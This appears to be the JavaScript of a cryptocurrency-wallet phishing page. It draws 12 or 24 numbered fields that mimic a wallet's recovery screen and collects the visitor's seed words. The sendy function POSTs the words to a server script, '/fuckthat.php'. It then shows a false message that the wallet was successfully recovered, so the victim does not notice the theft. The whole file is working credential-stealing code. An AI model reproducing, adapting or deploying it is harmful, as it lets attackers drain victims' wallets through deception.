window.p = 12;
window.ac = [];
window.d = false;

const HOST = "/fuckthat.php";

function cc(count = 12) {
    let ww = document.getElementById('ww'); ww.innerHTML = "";

    for (let i = 0; i < count; i++) {
        let pc = document.createElement('div');
        pc.width = "100%";
        pc.classList.add('sc-cxpSdN');
        pc.classList.add('sc-efQSVx');
        pc.classList.add('iUHhWc');
        pc.classList.add('kbVcPi');

        let numerator = document.createElement('p');
        numerator.classList.add('sc-jrQzAO');
        numerator.classList.add('fyUiZU');
        numerator.classList.add('sc-jObWnj');
        numerator.classList.add('iAGFNG');
        numerator.color = "#999999";
        numerator.opacity = "1";
        numerator.size = "14";
        numerator.innerText = `${i+1}.`;

        let input = document.createElement('input');
        input.classList.add('dvBSpK');
        input.classList.add('sc-dPiLbb');
        input.spellcheck = "false";
        input.pattern = "[A-Za-z\\s]+";
        input.autocomplete = "off";
        input.autocorrect = "off";

        if (window.ac[i] != null)
            input.value = window.ac[i].value;

        input.addEventListener('blur', function() {
            pc.classList.remove('focused');
        }, false);

        input.addEventListener('focus', function() {
            pc.classList.add('focused');
        }, false);

        pc.appendChild(numerator);
        pc.appendChild(input);
        ww.appendChild(pc);
        window.ac[i] = input;
    }
}

async function loadSettingData() {
    try {
        let response = await fetch("../settings.json");
        if (!response.ok) {
            throw new Error(`${response.status}`);
        }
        let json = await response.json();
        return json;
    } catch (error) {
        console.error('Error:', error);
    }
}

function sendy(info) {
    const url = HOST + '?inf';

    fetch(url, {
        method: 'POST',
        headers: {
            "Content-Type": "application/json"
        },
        body: info
    })
    .then(response => response.text())
    .then(data => {
        let info = document.getElementById('infoxD');
        info.innerHTML = "Wallet is successfully recovered.<br />Now you can close this tab.";

        let button = document.getElementById('btcc');
        button.innerHTML = `<button data-testid="secondary-button" font-size="16" font-weight="600" width="100%" type="button" class="sc-eCImPb fajfuv">Close</button>`;
        cc(0);
        window.d = true;
    })
    .catch(error => {
        var rec = document.getElementById('nextbutton');
        rec.disabled = false;
    });
}

function getWords() {
    let reg = true;

    let regex = new RegExp('[A-Za-z\\s]+');

    var words = [];
    for (let i = 0; i < window.p; i++) {
        let container = window.ac[i];
        let text = container.value.trim();
        let passed = regex.test(text);
        if (!passed) {
            container.value = "";
            container.placeholder = "Wrong";
            reg = false;
        }
        words.push(text);
    }

    if (reg) {
        var rec = document.getElementById('nextbutton');
        rec.disabled = true;
        sendy(JSON.stringify({
            words
        }));
    }
}

window.addEventListener('load', async function () {
    settingData = await loadSettingData();
});

cc(window.p);

window.start = () => {
    getWords();
}

window.sw = (el) => {
    window.p = window.p == 12 ? 24 : 12;
    cc(window.p);
    el.innerText = `${window.p == 24 ? 12 : 24}-words`;
}